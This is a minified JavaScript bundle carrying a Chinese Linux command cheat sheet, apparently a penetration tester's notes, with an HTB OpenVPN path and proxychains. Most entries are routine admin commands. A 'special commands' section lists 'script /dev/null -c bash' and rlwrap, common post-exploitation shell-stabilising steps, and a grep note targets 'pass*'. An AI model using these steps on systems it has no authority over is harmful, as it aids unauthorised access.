(window.webpackJsonp=window.webpackJsonp||[]).push([[43,5],{"+/qY":function(H,d,n){"use strict";n.r(d),n.d(d,"Linux_Unix_\u624B\u518C",function(){return c}),n.d(d,"Linux\u5E38\u89C1\u6307\u4EE4_cfg_\u4E8C\u7EA7\u624B\u518C",function(){return h});var S=n("tJVT"),t=n("q1tI"),l=n.n(t),r=n("/qoP"),e=n("ysNt"),u=n("QL8i"),m=n("s1IG"),E=n("jJ7j"),F=e.l.singleATag_blank,p={text:`
              proxychains4
                  nano  /etc/proxychains.conf
                  nano  /etc/proxychains4.conf

  `,cmd_cp:l.a.createElement(l.a.Fragment,null,l.a.createElement(m.b,{special_name:"Proxy\u8BBE\u7F6E",var_names_arr:[],code_template_arr:["nano  /etc/proxychains.conf","nano  /etc/proxychains4.conf"]}))},I={name:"\u3010Linux\u3011\u5E38\u89C1\u3010\u6307\u4EE4\u3011",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u65B9\u4FBF\u7684\u901F\u67E5\u624B\u518C",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u65B9\u4FBF\u7684\u901F\u67E5\u624B\u518C"),u.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.\u5FEB\u901F\u5B66\u4E60\u65B9\u6848.Linux\u65B9\u6CD5))},{name:"\u7BA1\u9053\u547D\u4EE4",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u7BA1\u9053\u547D\u4EE4"),`
              \u3010|\u3011
                  \u8FDE\u63A5\u591A\u4E2A\u547D\u4EE4\u3002
                  \u5E38\u89C1\u793A\u4F8B\uFF1A
                      cat  *  |  grep  -i  <\u5173\u952E\u5B57>*

              \u3010mkfifo\u3011
                  \u521B\u5EFA\u4E00\u4E2AFIFO\u7279\u6B8A\u6587\u4EF6                            \uFF08\u5148\u8FDB\u5148\u51FA\u961F\u5217 First In First Out\uFF09
                  \u662F\u4E00\u4E2A\u547D\u540D\u7BA1\u9053\uFF08\u53EF\u4EE5\u7528\u6765\u505A\u8FDB\u7A0B\u4E4B\u95F4\u901A\u4FE1\u7684\u6865\u6881\uFF09       \uFF08named pipe\uFF09

                  \u5176\u5B83\u7684\uFF1F\uFF1F\uFF1F

              \u3010>\u3011
                  \u8986\u76D6\u5199\u5165

              \u3010>>\u3011
                  \u8FFD\u52A0\u5199\u5165\uFF0C\u8FFD\u52A0\u5230\u5C3E\u90E8

              \u30102>/dev/null\u3011
                  \u5C06\u62A5\u9519\u4FE1\u606F\uFF0C\u5168\u90E8\u5BFC\u5411\u3010\u7A7A\u8BBE\u5907\u3011\u3002
                      \u5B9E\u9645\u4F5C\u7528\uFF0C\u5C31\u662F\u3010\u4E0D\u663E\u793A\u9519\u8BEF\u4FE1\u606F\u3011
                  \u672C\u8D28\u7406\u89E3\uFF1A
                      \u7B80\u5355\u7406\u89E3\u4E3A\uFF1A
                          \u30102\u3011\u662F\u7CFB\u7EDF\u5185\u7F6E\u6807\u8BC6\uFF0C\u7C7B\u4F3C\u4E8E\u53D8\u91CF
                          \u3010>\u3011\u662F\u7BA1\u9053\u7B26
                          \u3010/dev/null\u3011\u662F\u865A\u62DF\u5316\u7684\u7A7A\u8BBE\u5907\u3002    \uFF08\u5176\u5B9E\u4EE3\u8868\uFF0C\u4EC0\u4E48\u4E5F\u6CA1\u6709\uFF09

            `))},{name:"\u8EAB\u4EFD\u67E5\u770B",desc:l.a.createElement(l.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"QL8i")),Promise.resolve().then(n.bind(null,"ONbu"))]).then(function(w){var a=Object(S.a)(w,2),B=a[0],O=a[1];return l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u8EAB\u4EFD\u67E5\u770B"),`

              whoami
            `,B.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.whoami.Linux\u65B9\u6CD5,`

              id
                  123

              lslogins
                  \u5217\u4E3E\u7528\u6237\u7684\u5217\u8868\uFF0C\u548C\u5F53\u524D\u72B6\u6001

              groups
                  123

              passwd  <\u7528\u6237\u540D>
                  \u53EF\u4EE5\u4FEE\u6539\u3010\u5DF2\u6709\u7528\u6237\u3011\u7684\u5BC6\u7801\u3002

              mkpasswd

                  \u4ECB\u7ECD\uFF1B
                      \u8D44\u6599\uFF1Ahttps://deepinout.com/linux-cmd/linux-password-and-certificate-management-related-cmd/linux-cmd-mkpasswd.html

                      \u4F7F\u7528mkpasswd\u547D\u4EE4\u53EF\u4EE5\u751F\u6210\u65B0\u7684\u5BC6\u7801\uFF0C\u9009\u62E9\u5C06\u5176\u5E94\u7528\u4E8E\u7528\u6237\u3002

                  \u547D\u4EE4\uFF1A
                      mkpasswd  [\u9009\u9879]  [\u7528\u6237]

                      \u4E3E\u4F8B\uFF1A\u300A  mkpasswd  -m  sha-512  <\u4F60\u7684\u660E\u6587\u5BC6\u7801>  \u300B

                          \u7ED3\u679C\u793A\u4F8B\uFF1A
                              $6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1
                                  \u8FD9\u4E2A\u503C\uFF0C\u53EF\u80FD\u6BCF\u6B21\u90FD\u4E0D\u4E00\u6837\uFF1B\u56E0\u4E3A\u53EF\u80FD\u6709\u3010salt\u76D0\u503C\u3011

                                  \u3010$6\u3011\uFF0C\u5F53\u524D\u4F7F\u7528\u7684\u3010hash\u7B97\u6CD5\u3011\u7684\u6807\u8BC6\u7B26\u3002\u5728\u672C\u4F8B\u4E2D\uFF0C\u5C55\u793A\u4E3A\u3010SHA-512\u3011

                  \u5E38\u89C1\u9009\u9879\uFF1A
                      \u3010-m\u3011\uFF0C\u6307\u5B9A\u52A0\u5BC6\u7B97\u6CD5

            `))})},{name:"\u5E38\u7528\u914D\u7F6E\u6587\u4EF6\uFF0C\u4FEE\u6539",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u4FEE\u6539\u914D\u7F6E\u6587\u4EF6"),`
`.concat(p.text,`
              apt\u6E90
                  nano  /etc/apt/sources.list

            `)))},{name:"\u6587\u4EF6\u7CFB\u7EDF",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u6587\u4EF6\u7CFB\u7EDF"),`

              \u78C1\u76D8\u67E5\u770B

                  \u78C1\u76D8\u7A7A\u95F4
                      \u3010df  -h\u3011\uFF0C\u67E5\u770B\u78C1\u76D8\u4F7F\u7528\u7387

                      \u3010du  -sh  *\u3011\uFF0C\u67E5\u770B\u5177\u4F53\u6BCF\u4E2A\u76EE\u5F55  \u5360\u7528\u78C1\u76D8\u7A7A\u95F4
                          1. \u53EA\u67E5\u770B\u3010\u5F53\u524D\u76EE\u5F55\u3011\u4E0B\u7684\uFF0C\u6240\u4EE5\u9700\u8981  \u5148\u8FDB\u5165\u76EE\u5F55

                  Inode
                      \u3010df  -i\u3011\uFF0C\u67E5\u770B Inode \u4F7F\u7528\u60C5\u51B5

                      \u3010for  i  in  <\u5F53\u524D\u76EE\u5F55>/*;  do  echo  $i;  find  $i  |  wc  -l;  done  \u3011
                          \u9010\u4E2A\u6253\u5370\uFF0C\u6BCF\u4E2A\u76EE\u5F55\u7684  Inode\u60C5\u51B5

              \u6587\u4EF6\u7CFB\u7EDF\u6302\u8F7D

                  mount

                      123

                      \u8FDC\u7A0B\u6302\u8F7DSMB\u7684share
                          \u300Amount  -t  cifs  -o  ro,username=<\u7528\u6237\u540D>,password=<\u5BC6\u7801>  <Share\u5730\u5740>  <\u672C\u5730\u76EE\u5F55\u5982/mnt>    \u300B
                              \u3010-t\u3011\uFF0C\u6307\u5B9A\u3010\u6587\u4EF6\u7CFB\u7EDF\u7C7B\u578B\u3011
                                  \u76EE\u524D\u652F\u6301\u7684\u5305\u62EC\uFF1Aadfs,  affs,  autofs,  cifs, coda, coherent, cramfs, debugfs, devpts, efs, ext, ext2, ext3, ext4, hfs, hfsplus, hpfs, iso9660, jfs, minix,  msdos,  ncpfs,  nfs, nfs4,  ntfs,  proc,  qnx4,  ramfs, reiserfs, romfs, squashfs, smbfs, sysv, tmpfs, ubifs, udf, ufs, umsdos, usbfs, vfat, xenix, xfs, xiafs.
                              \u3010-o\u3011\uFF0C\u6307\u5B9A\u9009\u9879
                                  \u7528\u3010\u9017\u53F7\u5206\u9694\u7684\u9009\u9879\u5B57\u7B26\u4E32\u3011\uFF0C\u6765\u8868\u793A
                                  \u5E38\u89C1\u8868\u793A\uFF1A
                                      \u3010ro\u3011\uFF0Cread-only\uFF0C\u53EA\u8BFB

            `))},{name:"\u5B89\u88C5\u5305\u3001\u8F6F\u4EF6\u5305\u3001\u4E0D\u540C\u7248\u672C\u3001\u591A\u7248\u672C\u5207\u6362",content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          apt  update
          apt  upgrade

          apt  install  <\u8F6F\u4EF6\u5305>


          \u4E0D\u540C\u7248\u672C
              \u8D44\u6599\uFF1A
                  Java\u8BBE\u7F6E\uFF1Ahttps://stackoverflow.com/a/59321929/6264260

              \u8BBE\u7F6E
                  update-alternatives  --config  <\u8F6F\u4EF6\u540D>

              \u5217\u4E3E
                  update-<\u8F6F\u4EF6\u540D>-alternatives  --list
                  update-alternatives  --list  <\u8F6F\u4EF6\u540D>


          `))},{name:"\u7CFB\u7EDF\u4FE1\u606F\u67E5\u770B\u3002\u7248\u672C\u3001\u8FDB\u7A0B\u3001IP\u3001\u7F51\u7EDC\u3001\u7AEF\u53E3",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,l.a.createElement(m.b,{special_name:"\u8FDB\u7A0B\u3001\u7AEF\u53E3",var_names_arr:["pName","filePattern","port"],code_template_arr:["ss  -tl","ss  -tln","ps  aux  |  grep  ###<pName>###","ps  -ef  |  grep  ###<pName>###","cat  /proc/version  &&  uname  -a  &&  lsb_release  -a  &&  cat  /etc/issue","netstat  -tunlp  |  grep  ###<port>###","lsof -i","lsof -i:###<port>###"]}),E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u7CFB\u7EDF\u4FE1\u606F\u67E5\u770B"),`

              \u7CFB\u7EDF\u7248\u672C\u4FE1\u606F

                  \u67E5\u770BLinux\u3010\u5185\u6838\u7248\u672C\u3011
                      cat  /proc/version
                      uname  -a

                  \u67E5\u770BLinux\u3010\u7CFB\u7EDF\u7248\u672C\u3011
                      lsb_release  -a
                      cat  /etc/issue


                  \u5BF9\u4EE5\u4E0A\u7684\u603B\u7ED3\uFF08\u4E00\u6B21\u6027\u7EFC\u5408\u6307\u4EE4\uFF09

                      cat  /proc/version  &&  uname  -a  &&  lsb_release  -a  &&  cat  /etc/issue
                          \uFF08\u9700\u8981\u624B\u52A8\u7EF4\u62A4\uFF09

              \u8FDB\u7A0B\u3001

                  ps
                      ps  aux
                          \u4E3E\u4F8B\uFF1A\u300Aps aux | grep mongo\u300B

                      ps -ef
                          \u548C\u4E0A\u9762\u529F\u80FD\u4E00\u6837\uFF0C\u53EA\u662F\u8F93\u51FA\u683C\u5F0F\uFF0C\u9075\u4ECE\u4E0D\u540C\u6807\u51C6

                  kill  -9  <PID>
                      \u8FD9\u4E2A\u5F3A\u5927\u548C\u5371\u9669\u7684\u547D\u4EE4\u8FEB\u4F7F\u8FDB\u7A0B\u5728\u8FD0\u884C\u65F6\u7A81\u7136\u7EC8\u6B62\uFF0C\u8FDB\u7A0B\u5728\u7ED3\u675F\u540E\u4E0D\u80FD\u81EA\u6211\u6E05\u7406\u3002\u5371\u5BB3\u662F\u5BFC\u81F4\u7CFB\u7EDF\u8D44\u6E90\u65E0\u6CD5\u6B63\u5E38\u91CA\u653E\uFF0C\u4E00\u822C\u4E0D\u63A8\u8350\u4F7F\u7528\uFF0C\u9664\u975E\u5176\u4ED6\u529E\u6CD5\u90FD\u65E0\u6548\u3002
                              \u8D44\u6599\uFF1Ahttps://blog.csdn.net/lechengyuyuan/article/details/16337233

              IP\u3001\u7F51\u7EDC\u3001\u7AEF\u53E3

                  ip -a

                  ifconfig


                  fport               \uFF08Kali\u4E13\u7528\u5DE5\u5177\uFF09
                      \uFF08\u7591\u4F3C\uFF0C\u53C8\u662F\u4E00\u4E2A\u3010Windows\u5DE5\u5177\u3011\uFF1F\uFF1F\uFF1F\uFF09
                      \u67E5\u770B\u672C\u5730\u7AEF\u53E3

                  \u7AEF\u53E3
                      ss  -tl
                          \u5E26\u670D\u52A1\u540D\uFF08\u63A8\u8350\uFF09

                      ss  -tln
                          \u4ECB\u7ECD\uFF1A\u5168\u79F0\u4E3A\u3010Socket Statistics\u3011\uFF0C\u5957\u63A5\u5B57  \u7EDF\u8BA1\u3002
                          \u5FEB\u901F\u67E5\u770B\uFF0C\u3010\u672C\u5730\u7AEF\u53E3\u3011\u53CA\u3010\u670D\u52A1\u540D\u3011
                              \u5F88\u591A\u65F6\u5019\uFF0C\u3010\u4F4E\u6743\u9650\u7528\u6237\u3011\u4E0B\uFF0C\u6BD4\u3010netstat\u3011\u4FE1\u606F\u66F4\u591A\u3002
                          \u9009\u9879\uFF1A
                              \u3010-l\u3011\uFF0C\u53EA\u663E\u793A  listening\u72B6\u6001  \u7684\u5957\u63A5\u5B57
                              \u3010-t\u3011\uFF0C\u663E\u793A TCP \u5957\u63A5\u5B57
                              \u3010-n\u3011\uFF0C\u4E0D\u5C1D\u8BD5\u89E3\u6790  Service\u670D\u52A1\u540D
                                  \uFF08\uFF1F\uFF1F\u4F46\u662F\u8FD9\u4E2A\u6211\u9700\u8981\u554A\uFF09


                      netstat  -tunlp
                      netstat  -tunlp  |  grep  18080
                          \u9009\u9879\uFF1A
                              \u3010-t\u3011\uFF0C\u663E\u793ATCP
                              \u3010-u\u3011\uFF0C\u663E\u793AUDP
                              \u3010-n\u3011\uFF0C\u4E0D\u663E\u793A\u522B\u540D\uFF0C\u80FD\u663E\u793A\u6570\u5B57\u7684  \u5168\u90E8\u663E\u793A\u6570\u5B57
                              \u3010-l\u3011\uFF0C\u4EC5\u5217\u51FA  \u5F53\u524D\u6709\u5728 Listen(\u76D1\u542C) \u7684\u670D\u52A1 \u7684\u72B6\u6001
                              \u3010-p\u3011\uFF0C\u663E\u793A  \u5EFA\u7ACB\u76F8\u5173\u8FDE\u63A5  \u7684\u7A0B\u5E8F\u540D

                      lsof -i
                      lsof -i:<\u7AEF\u53E3\u53F7>

                  \u7F51\u7EDC\u6392\u67E5\u6307\u4EE4
                      (\u8D44\u6599\uFF1Ahttps://blog.csdn.net/wade3015/article/details/90779669)

                      1.\u67E5\u627E\u8BF7\u6C42\u6570\u524D20\u4E2AIP\uFF08\u5E38\u7528\u4E8E\u67E5\u627E\u653B\u6765\u6E90\uFF09\uFF1A
                      netstat -anlp|grep 80|grep tcp|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -n20

                      netstat -ant |awk '/:80/{split($5,ip,\u201D:\u201D);++A[ip[1]]}END{for(i in A) print A[i],i}' |sort -rn|head -n20

                      2.\u7528tcpdump\u55C5\u63A280\u7AEF\u53E3\u7684\u8BBF\u95EE\u770B\u770B\u8C01\u6700\u9AD8
                      tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F\u201D.\u201D '{print $1\u2033.\u201D$2\u2033.\u201D$3\u2033.\u201D$4}' | sort | uniq -c | sort -nr |head -20

                      3.\u67E5\u627E\u8F83\u591Atime_wait\u8FDE\u63A5
                      netstat -n|grep TIME_WAIT|awk '{print $5}'|sort|uniq -c|sort -rn|head -n20

                      4.\u627E\u67E5\u8F83\u591A\u7684SYN\u8FDE\u63A5
                      netstat -an | grep SYN | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr | more

                      5.\u6839\u636E\u7AEF\u53E3\u5217\u8FDB\u7A0B
                      netstat -ntlp | grep 80 | awk '{print $7}' | cut -d/ -f1

            `))},{name:"\u591A\u4EFB\u52A1\u3001\u524D\u540E\u53F0\u4EFB\u52A1",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1A
              https://www.linuxprobe.com/front-background-tasks.html

          <\u5E38\u89C4\u6307\u4EE4>  &
              \u76F4\u63A5\u7528\u3010\u540E\u53F0\u6A21\u5F0F\u3011\u542F\u52A8\u4EFB\u52A1\uFF0C\u4FDD\u6301\u3010\u8FD0\u884C\u4E2D\u3011\u72B6\u6001\u3002

          \u3010Ctrl+Z\u3011
              \u5C06\u5F53\u524D\u4EFB\u52A1\uFF0C\u5207\u6362\u5230\u3010\u540E\u53F0\u3011\uFF0C\u5E76\u3010\u505C\u6B62\u8FD0\u884C\u3011\u3002

          jobs
              jobs
                  \u5C55\u793A\u3010\u540E\u53F0\u4EFB\u52A1\u3011
                      \u5F62\u5F0F\uFF1A   [\u7F16\u53F7]\u2014\u2014PID\u2014\u2014\u8FD0\u884C\u72B6\u6001\u2014\u2014\u4EFB\u52A1\u6307\u4EE4
              jobs  -l
                  \u5C55\u793A\u3010\u540E\u53F0\u4EFB\u52A1\u3011\uFF0C\u4EE5\u5217\u8868\u5F62\u5F0F

          fg
              fg
                  \u5C06\u3010\u6700\u8FD1\u4E00\u6B21\u4EFB\u52A1\u3011\uFF0C\u8C03\u5230\u524D\u53F0
              fg  %<\u7F16\u53F7>
                  \u5C06\u3010\u6307\u5B9A\u7F16\u53F7\u4EFB\u52A1\u3011\uFF0C\u8C03\u5230\u524D\u53F0

          bg
              bg
                  \u5C06\u3010\u5DF2\u5728\u540E\u53F0\u3011\u7684\u3010\u6700\u8FD1\u4E00\u6B21\u4EFB\u52A1\u3011\uFF0C\u3010\u91CD\u65B0\u6062\u590D\u8FD0\u884C\u3011
              bg  %<\u7F16\u53F7>
                  \u5C06\u3010\u5DF2\u5728\u540E\u53F0\u3011\u7684\u3010\u6307\u5B9A\u7F16\u53F7\u4EFB\u52A1\u3011\uFF0C\u3010\u91CD\u65B0\u6062\u590D\u8FD0\u884C\u3011

          \u5173\u95ED\u591A\u4EFB\u52A1
              kill  <PID>
                  \u5E38\u89C4\u5173\u95ED
              kill  %<\u7F16\u53F7>
                  \u6309\u3010\u7F16\u53F7\u3011\u8FDB\u884C\u5173\u95ED

          `))},{name:"\u7F51\u7EDC\u8BF7\u6C42",desc:l.a.createElement(l.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"QL8i")),Promise.resolve().then(n.bind(null,"ONbu"))]).then(function(w){var a=Object(S.a)(w,2),B=a[0],O=a[1];return l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u7F51\u7EDC\u8BF7\u6C42"),`



              curl

                  \u57FA\u672C\u4ECB\u7ECD\uFF1A
                      \u662F\u4E00\u4E2A\u547D\u4EE4\u884C\u5DE5\u5177\uFF0C\u7528\u4E8E\u4F7F\u7528 URL \u8BED\u6CD5\u4F20\u8F93\u6570\u636E
                      \u652F\u6301 DICT\u3001FILE\u3001FTP\u3001FTPS\u3001GOPHER\u3001HTTP\u3001HTTPS\u3001IMAP\u3001IMAPS\u3001LDAP\u3001LDAPS\u3001POP3\u3001 POP3S\u3001RTMP\u3001RTSP\u3001SCP\u3001SFTP\u3001SMTP\u3001SMTPS\u3001TELNET \u548C TFTP.curl \u652F\u6301 SSL \u8BC1\u4E66\u3001HTTP POST\u3001HTTP PUT\u3001FTP \u4E0A\u4F20\u3001\u57FA\u4E8E HTTP \u8868\u5355\u7684\u4E0A\u4F20\u3001\u4EE3\u7406\u3001cookie\u3001
                      \u7528\u6237+\u5BC6\u7801\u8EAB\u4EFD\u9A8C\u8BC1\uFF08\u57FA\u672C\u3001\u6458\u8981\u3001NTLM\u3001Negotiate\u3001kerberos...)\u3001\u6587\u4EF6\u4F20\u8F93\u6062\u590D\u3001\u4EE3\u7406\u96A7\u9053
                      \u548C\u5927\u91CF\u5176\u4ED6\u6709\u7528\u7684\u6280\u5DE7

                  \u57FA\u672C\u4F7F\u7528
                      curl  -v  <url\u5730\u5740>
                          \u300A-v\u300B\uFF0C\u65E5\u5FD7\u8F93\u51FA\uFF0C

                  \u5E38\u89C1\u9009\u9879
                      \u300A-v\u300B\uFF0C\u65E5\u5FD7\u8F93\u51FA
                          verbose\u7EA7\u522B
                          \u663E\u793A(\u66F4\u8BE6\u7EC6)\u901A\u4FE1\u7684\u6574\u4E2A\u8FC7\u7A0B

                      \u300A--trace\u300B\uFF0C\u65E5\u5FD7\u8F93\u51FA
                          \u8F93\u51FA\u539F\u59CB\u7684\u4E8C\u8FDB\u5236\u6570\u636E
                          \u6BD4 verbose \u66F4\u4E3A\u8BE6\u7EC6

                      \u3010-K\u3011\uFF0C\u6307\u5B9A\u4E00\u4E2A\u3010\u914D\u7F6E\u6587\u4EF6\u3011
                          123


              wget
            `,B.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.wget.Linux\u65B9\u6CD5,`


            `))})},{name:"\u670D\u52A1\u3001\u7CFB\u7EDF\u670D\u52A1\u3001service\u3001systemctl",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u3010service\u3011 \u65B9\u5F0F"),`
            service <\u670D\u52A1> start
            service <\u670D\u52A1> status
            service <\u670D\u52A1> stop
            service <\u670D\u52A1> restart

            service --status-all
                    \u53EF\u4EE5\u67E5\u770B\uFF0C\u3010\u6240\u6709\u670D\u52A1\u3011\u7684\u5019\u9009

            `))},{name:"\u4EE3\u7406\u3001\u5168\u5C40\u4EE3\u7406",content:Promise.all([Promise.resolve().then(n.bind(null,"FOD2"))]).then(function(w){var a=Object(S.a)(w,1),B=a[0];return l.a.createElement(l.a.Fragment,null,p.cmd_cp,l.a.createElement(m.b,{special_name:"Proxy\u8BBE\u7F6E",var_names_arr:["proxy_url"],code_template_arr:["nohup      openvpn /root/HTB/\u914D\u7F6E\u6587\u4EF6/starting_point_hanshou101.ovpn      &","pip  install  xxx  --proxy=###<proxy_url>###",`
            export  proxy="###<proxy_url>###"
            export  http_proxy=$proxy
            export  https_proxy=$proxy
            export  ftp_proxy=$proxy
            export  all_proxy=$proxy
            export  no_proxy="localhost, 127.0.0.1, ::1"
            `]}),E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5168\u5C40\u4EE3\u7406
              \u8D44\u6599\uFF1Ahttps://cloud.tencent.com/developer/article/2129796

              \u4E34\u65F6\u751F\u6548\uFF1A

                      export proxy="http://192.168.5.14:8118"
                      export http_proxy=$proxy
                              \u4E3Ahttp\u53D8\u91CF\u8BBE\u7F6E\u4EE3\u7406\uFF1B\u9ED8\u8BA4\u4E0D\u586B\u5F00\u5934\u4EE5http\u534F\u8BAE\u4F20\u8F93
                                      \u793A\u4F8B\uFF1A
                                              http://10.0.0.51:8080
                                              http://user:pass@10.0.0.10:8080
                                              socks4://10.0.0.51:1080
                                              socks5://192.168.1.1:1080

                      export https_proxy=$proxy
                              \u4E3Ahttps\u53D8\u91CF\u8BBE\u7F6E\u4EE3\u7406\uFF1B
                      export ftp_proxy=$proxy
                              \u4E3Aftp\u53D8\u91CF\u8BBE\u7F6E\u4EE3\u7406\uFF1B
                      export all_proxy=$proxy
                              \u5168\u90E8\u53D8\u91CF\u8BBE\u7F6E\u4EE3\u7406\uFF0C\u8BBE\u7F6E\u4E86\u8FD9\u4E2A\u65F6\u5019\u4E0A\u9762\u7684\u4E0D\u7528\u8BBE\u7F6E
                      export no_proxy="localhost, 127.0.0.1, ::1"
                              \u65E0\u9700\u4EE3\u7406\u7684\u4E3B\u673A\u6216\u57DF\u540D\uFF1B \u53EF\u4EE5\u4F7F\u7528\u901A\u914D\u7B26\uFF1B \u591A\u4E2A\u65F6\u4F7F\u7528\u201C,\u201D\u53F7\u5206\u9694\uFF1B


          \u96A7\u9053\u8BBF\u95EE

              OpenVPN

                  nohup      openvpn /root/HTB/\u914D\u7F6E\u6587\u4EF6/starting_point_hanshou101.ovpn      &

              SSH
                  \u53E6\u89C1\u3010SSH\u3011
          `,Object(r.d)({\u667A\u80FD\u6B65\u9AA4_cfg:B.SSH_Telnet_\u624B\u518C}),`

          `))})},{name:"\u7279\u6B8A\u547D\u4EE4",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u7279\u6B8A\u547D\u4EE4"),`

            script

                script  /dev/null  -c  bash

            rlwrap
                \u4F3C\u4E4E\u662F\u3010\u4E00\u5C42\u5305\u88F9\u5668\u3011\uFF1F\uFF1F\uFF1F

            `))},{name:"\u6587\u4EF6\u67E5\u770B\u3001\u6587\u4EF6\u641C\u7D22\u3001\u6587\u4EF6\u64CD\u4F5C\u3001\u76EE\u5F55\u67E5\u770B",desc:l.a.createElement(l.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"QL8i")),Promise.resolve().then(n.bind(null,"ONbu"))]).then(function(w){var a=Object(S.a)(w,2),B=a[0],O=a[1];return l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u76EE\u5F55\u6587\u4EF6"),`

              \u524D\u5F80\u76EE\u5F55
            `,B.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.cd.Linux\u65B9\u6CD5,`

              \u65B0\u5EFA
                  mkdir  <\u76EE\u5F55>

                  mkdir  -p  <\u591A\u7EA7\u76EE\u5F55\u4E2D\u95F4\u65AD\u5C42>
                      \u81EA\u52A8\u521B\u5EFA\uFF0C\u4E2D\u95F4\u4E0D\u5B58\u5728\u7684\u76EE\u5F55

                  touch  <\u65B0\u6587\u4EF6\u540D>

              \u5220\u9664
                  rm

              \u67E5\u770B

                  ls

                      ls  -al
                          \u7B49\u540C\u4E8E\u3010ls  -l  -a\u3011

                          \u3010-l\u3011\uFF0C\u5217\u8868\u663E\u793A

                          \u3010-a\u3011\uFF0C\u663E\u793A\u5168\u90E8\u6587\u4EF6

                      \u3010\u5E38\u89C1\u9009\u9879\u3011
                          \u3010-t\u3011
                              \u6309\u65F6\u95F4\u6233\uFF0C\u4ECE\u65B0\u5230\u8001 \u6392\u5E8F
                          \u3010-r\u3011
                              (\u5728\u5DF2\u6709\u987A\u5E8F\u4E0A)\u53CD\u5411\u6392\u5E8F
                                  \u6BD4\u5982\uFF0C\u5C06\u65F6\u95F4\u6233  \u4ECE\u8001\u5230\u65B0 \u6392\u5E8F



                  cat
                      cat  <\u6587\u4EF6\u8DEF\u5F84>
                          \u67E5\u770B\u5355\u4E2A\u6587\u4EF6

                      cat  *
                          \u67E5\u770B\u3010\u5F53\u524D\u76EE\u5F55\u3011\u7684\u3010\u6240\u6709\u6587\u4EF6\u3011\u5185\u5BB9

                      find . -name '*.*' -exec cat {} \\;
                          \u53E6\u4E00\u79CD\u5F62\u5F0F\uFF0C\u9012\u5F52\u76EE\u5F55\u3010\u67E5\u770B\u5185\u5BB9\u3011

                  grep
                      \u3010glob\u901A\u914D\u7B26\u3011\u7684\u7279\u6B8A\u60C5\u51B5\uFF1A

                          \u3010*pass*\u3011\u6CA1\u6709\u610F\u4E49\u3002\u56E0\u4E3A\u3010*\u3011\u524D\u9762\u5FC5\u987B\u8981\u6709\u4E1C\u897F
                              \u3010*\u3011\u4EE3\u8868\u91CD\u590D\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F

                          \u3010pass*\u3011\u6709\u610F\u4E49\u3002

                      grep  -i  "<glob\u901A\u914D\u7B26>"
                          \u4E00\u822C\u6765\u8BF4\uFF0C\u975E\u5E38\u5EFA\u8BAE\u3010\u5305\u88F9\u53CC\u5F15\u53F7\u3011\uFF0C \u8FD9\u6837\u5904\u7406\u3010\u7279\u6B8A\u7B26\u53F7\u3011\u4F1A\u6B63\u5E38\u5F88\u591A
                          \u3010-i\u3011\uFF0C\u5FFD\u7565\u5927\u5C0F\u5199

                      \u9012\u5F52\u67E5\u627E\u76EE\u5F55\u4E2D\u6587\u4EF6
                          grep  -r  "\u5173\u952E\u5B57"  <\u8DEF\u5F84\u5982\u3010./*\u3011>
                              \u9ED8\u8BA4\u4E0D\u4F1A\u8DDF\u968F\u3010symbol link \u7B26\u53F7\u94FE\u63A5\u3011

                      \u3010\u53CD\u5411\u6392\u9664\u3011\u4F3C\u4E4E\u4E0D\u592A\u597D\u7528\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F

                      \u5E38\u89C1\u9009\u9879\uFF1A
                          \u3010-a\u3001 --text\u3011
